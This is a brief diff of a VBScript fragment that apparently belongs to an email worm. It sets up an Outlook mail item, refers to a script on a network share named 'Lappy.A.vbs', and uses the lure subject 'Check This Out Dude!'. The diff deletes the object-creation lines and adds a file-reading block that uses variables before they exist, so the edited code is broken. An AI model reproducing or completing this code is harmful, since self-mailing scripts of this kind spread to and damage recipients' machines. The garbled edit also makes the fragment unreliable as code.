@@ -1,5 +1,8 @@
-Set objFSO = CreateObject("Scripting.FileSystemObject")
-Set objOutlook = CreateObject("Outlook.Application")
+If objFSO.FileExists(strFilePath) Then
+    Set objFile = objFSO.OpenTextFile(strFilePath, 1)
+    ' Do operations
+    objFile.Close
+End If
 Set objMail = objOutlook.CreateItem(0)
 strFilePath = "\\network\share\Lappy.A.vbs"
 strEmailSubject = "Check This Out Dude!"
